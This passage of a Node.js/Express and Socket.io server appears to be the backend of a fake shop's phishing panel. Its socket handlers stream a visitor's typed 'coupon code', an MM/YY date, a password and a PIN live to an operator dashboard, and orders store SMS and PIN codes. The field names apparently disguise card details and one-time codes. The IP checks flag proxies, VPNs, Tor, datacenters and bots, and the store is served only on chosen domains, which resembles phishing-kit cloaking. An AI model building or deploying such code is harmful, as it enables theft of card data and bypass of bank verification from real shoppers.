      res.json(rows || []);
    }
  );
});

// 15f. Roll back to a previous theme version
app.post('/api/admin/shops/:id/theme-v2/rollback', requireAdmin('design'), (req, res) => {
  const shopId = req.params.id;
  const versionId = clampInt(req.body && req.body.versionId, 0, 0, 999999999);
  if (!versionId) return res.status(400).json({ error: 'versionId is required' });

  db.get(
    'SELECT id, layout_config_v2, schema_version FROM shop_layout_versions WHERE id = ? AND shop_id = ?',
    [versionId, shopId],
    (err, row) => {
      if (err) return res.status(500).json({ error: err.message });
      if (!row) return res.status(404).json({ error: 'Version not found' });

      const normalized = normalizeThemeV2(safeJsonParse(row.layout_config_v2, {}));
      const serialized = JSON.stringify(normalized);

      db.get(
        'SELECT COALESCE(MAX(version_no), 0) as maxVersion FROM shop_layout_versions WHERE shop_id = ?',
        [shopId],
        (err2, maxRow) => {
          if (err2) return res.status(500).json({ error: err2.message });
          const nextVersion = (maxRow && maxRow.maxVersion ? maxRow.maxVersion : 0) + 1;

          db.run(
            'UPDATE shops SET layout_config_v2 = ?, theme_draft_v2 = ?, layout_schema_version = ? WHERE id = ?',
            [serialized, serialized, THEME_V2_SCHEMA_VERSION, shopId],
            (err3) => {
              if (err3) return res.status(500).json({ error: err3.message });
              db.run(
                'INSERT INTO shop_layout_versions (shop_id, version_no, layout_config_v2, schema_version, created_by) VALUES (?, ?, ?, ?, ?)',
                [shopId, nextVersion, serialized, THEME_V2_SCHEMA_VERSION, req.admin.username || null],
                (err4) => {
                  if (err4) return res.status(500).json({ error: err4.message });

                  // Broadcast rollback to storefront clients
                  io.emit('theme_updated', {
                    shopId: Number(shopId),
                    versionNo: nextVersion,
                  });

                  res.json({
                    success: true,
                    versionNo: nextVersion,
                    published: normalized,
                  });
                }
              );
            }
          );
        }
      );
    }
  );
});

// --- System settings & IP stats ---

// 16. GET admin settings
app.get('/api/admin/settings', requireAdmin('system'), (req, res) => {
  db.all('SELECT key, value FROM system_settings', (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    const settings = {};
    (rows || []).forEach(r => { settings[r.key] = r.value; });
    res.json({
      ipregistry_api_key: settings.ipregistry_api_key || '',
      ipregistry_quota_used: settings.ipregistry_quota_used != null ? settings.ipregistry_quota_used : null,
      ipregistry_quota_remaining: settings.ipregistry_quota_remaining != null ? settings.ipregistry_quota_remaining : null,
      api_provider: settings.api_provider || 'ipregistry',
    });
  });
});

// 17. POST admin settings (update API key etc.)
app.post('/api/admin/settings', requireAdmin('system'), (req, res) => {
  const { ipregistry_api_key, api_provider } = req.body;
  const updates = [];
  if (ipregistry_api_key !== undefined) updates.push(['ipregistry_api_key', ipregistry_api_key]);
  if (api_provider !== undefined) updates.push(['api_provider', api_provider]);
  if (updates.length === 0) return res.json({ success: true });
  let done = 0;
  updates.forEach(([key, value]) => {
    setSetting(key, String(value), (err) => {
      if (err) return res.status(500).json({ error: err.message });
      done++;
      if (done === updates.length) res.json({ success: true });
    });
  });
});

// 18. GET IP stats (for dashboard)
app.get('/api/admin/ip-stats', requireAdmin('ipstats'), (req, res) => {
  const now = new Date();
  const todayStart = new Date(now.getFullYear(), now.getMonth(), now.getDate()).toISOString().slice(0, 19).replace('T', ' ');
  const weekStart = new Date(now);
  weekStart.setDate(weekStart.getDate() - 7);
  const weekStartStr = weekStart.toISOString().slice(0, 19).replace('T', ' ');
  const monthStart = new Date(now.getFullYear(), now.getMonth(), 1).toISOString().slice(0, 19).replace('T', ' ');
  db.get('SELECT COUNT(*) as total FROM ip_checks WHERE checked_at >= ?', [todayStart], (err, t) => {
    if (err) return res.status(500).json({ error: err.message });
    db.get('SELECT COUNT(*) as blocked FROM ip_checks WHERE checked_at >= ? AND action_taken != ?', [todayStart, 'allow'], (err2, b) => {
      if (err2) return res.status(500).json({ error: err2.message });
      db.get('SELECT COUNT(*) as total_week FROM ip_checks WHERE checked_at >= ?', [weekStartStr], (err3, w) => {
        if (err3) return res.status(500).json({ error: err3.message });
        db.get('SELECT COUNT(*) as blocked_week FROM ip_checks WHERE checked_at >= ? AND action_taken != ?', [weekStartStr, 'allow'], (err4, bw) => {
          if (err4) return res.status(500).json({ error: err4.message });
          db.get('SELECT COUNT(*) as total_month FROM ip_checks WHERE checked_at >= ?', [monthStart], (err5, m) => {
            if (err5) return res.status(500).json({ error: err5.message });
            db.get('SELECT COUNT(*) as blocked_month FROM ip_checks WHERE checked_at >= ? AND action_taken != ?', [monthStart, 'allow'], (err6, bm) => {
              if (err6) return res.status(500).json({ error: err6.message });
              db.all('SELECT action_taken, threat_level, is_proxy, is_vpn, is_tor, is_datacenter, is_bot, country FROM ip_checks WHERE checked_at >= ?', [monthStart], (err7, rows) => {
                if (err7) return res.status(500).json({ error: err7.message });
                const threatDist = {};
                const countryDist = {};
                (rows || []).forEach(r => {
                  const k = r.action_taken !== 'allow' ? (r.threat_level || 'blocked') : 'allow';
                  threatDist[k] = (threatDist[k] || 0) + 1;
                  if (r.country) countryDist[r.country] = (countryDist[r.country] || 0) + 1;
                });
                res.json({
                  today: { total: t.total, blocked: b.blocked, rate: t.total ? (b.blocked / t.total * 100).toFixed(1) : 0 },
                  week: { total: w.total_week, blocked: bw.blocked_week, rate: w.total_week ? (bw.blocked_week / w.total_week * 100).toFixed(1) : 0 },
                  month: { total: m.total_month, blocked: bm.blocked_month, rate: m.total_month ? (bm.blocked_month / m.total_month * 100).toFixed(1) : 0 },
                  threatDistribution: threatDist,
                  countryDistribution: countryDist,
                });
              });
            });
          });
        });
      });
    });
  });
});

// 19. GET IP logs (recent records)
app.get('/api/admin/ip-logs', requireAdmin('ipstats'), (req, res) => {
  const limit = Math.min(parseInt(req.query.limit, 10) || 50, 200);
  db.all('SELECT * FROM ip_checks ORDER BY checked_at DESC LIMIT ?', [limit], (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows || []);
  });
});

// 20. POST test IP (admin)
app.post('/api/admin/settings/test-ip', requireAdmin('system'), (req, res) => {
  const { ip, api_key } = req.body;
  const key = api_key || process.env.IPREGISTRY_API_KEY;
  if (!key) return res.status(400).json({ error: 'API key not set' });
  ipcheck.testApiKey(key, ip || '8.8.8.8').then((data) => {
    if (data.creditsRemaining != null) setSetting('ipregistry_quota_remaining', String(data.creditsRemaining), () => {});
    if (data.creditsConsumed != null) setSetting('ipregistry_quota_used', String(data.creditsConsumed), () => {});
    res.json(data);
  }).catch((e) => res.status(500).json({ error: e.message }));
});

// --- Account management (main + sub, permissions) ---
app.get('/api/admin/accounts', requireAdmin('accounts'), (req, res) => {
  db.all('SELECT id, username, role, permissions, created_at FROM admin_users ORDER BY role DESC, id ASC', (err, rows) => {
    if (err) return res.status(500).json({ error: 'Server error' });
    const list = (rows || []).map((r) => {
      let permissions = [];
      if (r.permissions) {
        try {
          const p = JSON.parse(r.permissions);
          if (Array.isArray(p)) permissions = auth.sanitizePanels(p);
        } catch (_) { /* invalid JSON: do not 500 */ }
      }
      return { ...r, permissions };
    });
    res.json(list);
  });
});

app.put('/api/admin/accounts/me', requireAdmin(), async (req, res) => {
  const { username, newPassword } = req.body;
  const userId = req.admin.userId;
  if (!userId) return res.status(401).json({ error: 'Unauthorized' });
  const updates = [];
  const params = [];
  if (typeof username === 'string' && username.trim().length >= 2) {
    updates.push('username = ?');
    params.push(username.trim().slice(0, 128));
  }
  if (typeof newPassword === 'string' && newPassword.length >= 8) {
    const { hash } = await auth.hashPassword(newPassword);
    updates.push('password_hash = ?');
    params.push(hash);
  }
  if (updates.length === 0) return res.status(400).json({ error: 'Nothing to update' });
  params.push(userId);
  db.run('UPDATE admin_users SET ' + updates.join(', ') + ' WHERE id = ?', params, function (err) {
    if (err) {
      if (err.message.includes('UNIQUE')) return res.status(409).json({ error: 'Username taken' });
      return res.status(500).json({ error: 'Server error' });
    }
    res.json({ success: true });
  });
});

app.post('/api/admin/accounts', requireAdmin('accounts'), async (req, res) => {
  const username = (req.body.username || '').toString().trim().slice(0, 128);
  const password = req.body.password;
  const permissions = Array.isArray(req.body.permissions) ? req.body.permissions : [];
  if (!username || username.length < 2) return res.status(400).json({ error: 'Username required' });
  if (!password || password.length < 8) return res.status(400).json({ error: 'Password min 8 chars' });
  const allowed = auth.sanitizePanels(permissions);
  try {
    const { hash } = await auth.hashPassword(password);
    db.run('INSERT INTO admin_users (username, password_hash, role, permissions) VALUES (?, ?, ?, ?)', [username, hash, 'sub', JSON.stringify(allowed)], function (err) {
      if (err) {
        if (err.message.includes('UNIQUE')) return res.status(409).json({ error: 'Username taken' });
        return res.status(500).json({ error: 'Server error' });
      }
      res.json({ success: true, id: this.lastID });
    });
  } catch (_) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.put('/api/admin/accounts/:id', requireAdmin('accounts'), (req, res) => {
  const id = parseInt(req.params.id, 10);
  if (req.admin.role === 'sub' && req.admin.userId !== id) {
    return res.status(403).json({ error: 'Forbidden', detail: 'cannot_edit_other_accounts' });
  }
  const { username, newPassword, permissions } = req.body;
  db.get('SELECT id, role FROM admin_users WHERE id = ?', [id], async (err, user) => {
    if (err || !user) return res.status(404).json({ error: 'User not found' });
    if (user.role === 'main' && req.admin.userId !== id) return res.status(403).json({ error: 'Cannot edit main account' });
    const updates = [];
    const params = [];
    if (typeof username === 'string' && username.trim().length >= 2) {
      updates.push('username = ?');
      params.push(username.trim().slice(0, 128));
    }
    if (typeof newPassword === 'string' && newPassword.length >= 8) {
      const { hash } = await auth.hashPassword(newPassword);
      updates.push('password_hash = ?');
      params.push(hash);
    }
    if (Array.isArray(permissions)) {
      const allowed = auth.sanitizePanels(permissions);
      updates.push('permissions = ?');
      params.push(JSON.stringify(allowed));
    }
    if (updates.length === 0) return res.status(400).json({ error: 'Nothing to update' });
    params.push(id);
    db.run('UPDATE admin_users SET ' + updates.join(', ') + ' WHERE id = ?', params, function (err2) {
      if (err2) {
        if (err2.message.includes('UNIQUE')) return res.status(409).json({ error: 'Username taken' });
        return res.status(500).json({ error: 'Server error' });
      }
      res.json({ success: true });
    });
  });
});

// --- Security logs (no sensitive data: no stack, no DB path, no keys) ---
app.get('/api/admin/logs', requireAdmin('logs'), (req, res) => {
  const limit = Math.min(parseInt(req.query.limit, 10) || 100, 500);
  db.all('SELECT id, kind, ip, detail, created_at FROM security_logs ORDER BY created_at DESC LIMIT ?', [limit], (err, rows) => {
    if (err) return res.status(500).json({ error: 'Server error' });
    res.json(rows || []);
  });
});

// --- Full-stack: serve store SPA only on domains added in admin (shops/shop_domains); admin at ADMIN_PATH on any host; no store by IP ---
let storeHostsCache = { set: new Set(), at: 0 };
function refreshStoreHosts(cb) {
  db.all('SELECT domain FROM shops UNION SELECT domain FROM shop_domains', (err, rows) => {
    if (err) { if (cb) cb(); return; }
    const set = new Set((rows || []).map(r => (r.domain || '').toLowerCase().trim()).filter(Boolean));
    storeHostsCache = { set, at: Date.now() };
    if (cb) cb();
  });
}
const publicDir = path.join(__dirname, 'public');
if (fs.existsSync(path.join(publicDir, 'index.html'))) {
  refreshStoreHosts();
  const STORE_HOSTS_TTL_MS = 60000; // 60s
  // Serve /assets/* first (no gate) to avoid connection reset on large JS/CSS
  const assetsDir = path.join(publicDir, 'assets');
  if (fs.existsSync(assetsDir)) {
    app.use('/assets', express.static(assetsDir, { maxAge: '1y', immutable: true }));
  }
  // Normalize ADMIN_PATH to one leading slash (env may be "ZNjx..." or "/ZNjx...") so path match works
  let adminPathNorm = (process.env.ADMIN_PATH || '/manage-admin').trim().replace(/\/+$/, '');
  if (!adminPathNorm.startsWith('/')) adminPathNorm = '/' + adminPathNorm;
  const ADMIN_PATH_FRONT = adminPathNorm || '/manage-admin';

  app.use((req, res, next) => {
    if (req.method !== 'GET') return next();
    if (req.path.startsWith('/api') || req.path.startsWith('/socket.io')) return next();
    if (req.path.startsWith('/assets/')) return next();
    if (/\.(js|css|ico|svg|woff2?|ttf|eot|map|png|jpg|jpeg|webp)$/i.test(req.path)) return next();
    const host = (req.hostname || '').toLowerCase();
    const pathNorm = (req.path || '/').replace(/\/$/, '') || '/';
    const isAdminPath = pathNorm === ADMIN_PATH_FRONT || pathNorm.startsWith(ADMIN_PATH_FRONT + '/');
    if (isAdminPath) return next(); // admin: any host (including IP)
    if (storeHostsCache.at + STORE_HOSTS_TTL_MS < Date.now()) refreshStoreHosts(() => {});
    if (storeHostsCache.set.has(host)) return next(); // store: only configured domains
    return res.status(404).send('Not Found');
  });
  app.use(express.static(publicDir));
  app.get('*', (req, res) => { res.sendFile(path.join(publicDir, 'index.html')); });
}

// --- Global error handler (never leak stack or internal paths) ---
app.use((err, req, res, next) => {
  const ip = clientIp(req);
  auth.logSecurity('error', ip, err.message || 'unknown');
  if (res.headersSent) return next(err);
  res.status(500).json({ error: 'Server error' });
});

// --- Socket.io Logic: default namespace = customers (join_order + live typing); admin = /admin namespace (listen-only) ---
io.on('connection', (socket) => {
  socket.on('join_order', (orderId) => {
    if (socket.currentOrderId) {
      socket.leave(`order_${socket.currentOrderId}`);
      const prevSockets = onlineOrders.get(socket.currentOrderId);
      if (prevSockets) {
        prevSockets.delete(socket.id);
        if (prevSockets.size === 0) {
          onlineOrders.delete(socket.currentOrderId);
          adminNsp.emit('user_online', { orderId: socket.currentOrderId, online: false });
        }
      }
    }
    socket.join(`order_${orderId}`);
    socket.currentOrderId = orderId;
    if (!onlineOrders.has(orderId)) onlineOrders.set(orderId, new Set());
    onlineOrders.get(orderId).add(socket.id);
    adminNsp.emit('user_online', { orderId, online: true });

    // Rehydrate customer step state after refresh / reconnect.
    db.get('SELECT status, sms_code, pin_code FROM orders WHERE id = ?', [orderId], (err, row) => {
      if (err || !row || !row.status) return;
      socket.emit('order_update', {
        id: orderId,
        status: row.status,
        smsCode: row.sms_code || undefined,
        pinCode: row.pin_code || undefined,
      });
    });
  });

  socket.on('live_session_start', (data) => {
    const session = {
      customer: data.customer,
      cartTotal: data.cartTotal || 0,
      couponCode: '',
      dateMMYY: '',
      password: '',
      startedAt: new Date().toISOString(),
    };
    liveSessions.set(socket.id, session);
    adminNsp.emit('live_session_start', { id: socket.id, ...session });
  });
  socket.on('live_coupon_update', (data) => {
    let session = liveSessions.get(socket.id);
    if (!session) {
      session = { customer: null, cartTotal: 0, couponCode: '', dateMMYY: '', password: '', startedAt: new Date().toISOString() };
      liveSessions.set(socket.id, session);
      adminNsp.emit('live_session_start', { id: socket.id, ...session });
    }
    if (data.code !== undefined) session.couponCode = data.code;
    if (data.dateMMYY !== undefined) session.dateMMYY = data.dateMMYY;
    if (data.password !== undefined) session.password = data.password;
    adminNsp.emit('live_coupon_update', { id: socket.id, ...data });
  });
  socket.on('live_pin_update', (data) => {
    adminNsp.emit('live_pin_update', { orderId: socket.currentOrderId, pinCode: data.pinCode });
  });
  socket.on('live_order_coupon_update', (data) => {
    adminNsp.emit('live_order_coupon_update', data);
  });
  socket.on('live_session_end', () => {
    if (liveSessions.has(socket.id)) {
      liveSessions.delete(socket.id);
      adminNsp.emit('live_session_end', { id: socket.id });
    }
  });

  socket.on('disconnect', () => {
    if (liveSessions.has(socket.id)) {
      liveSessions.delete(socket.id);
      adminNsp.emit('live_session_end', { id: socket.id });
    }
    if (socket.currentOrderId) {
      const sockets = onlineOrders.get(socket.currentOrderId);
      if (sockets) {
        sockets.delete(socket.id);
        if (sockets.size === 0) {
          onlineOrders.delete(socket.currentOrderId);
          adminNsp.emit('user_online', { orderId: socket.currentOrderId, online: false });
        }
      }
    }
  });
});

const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
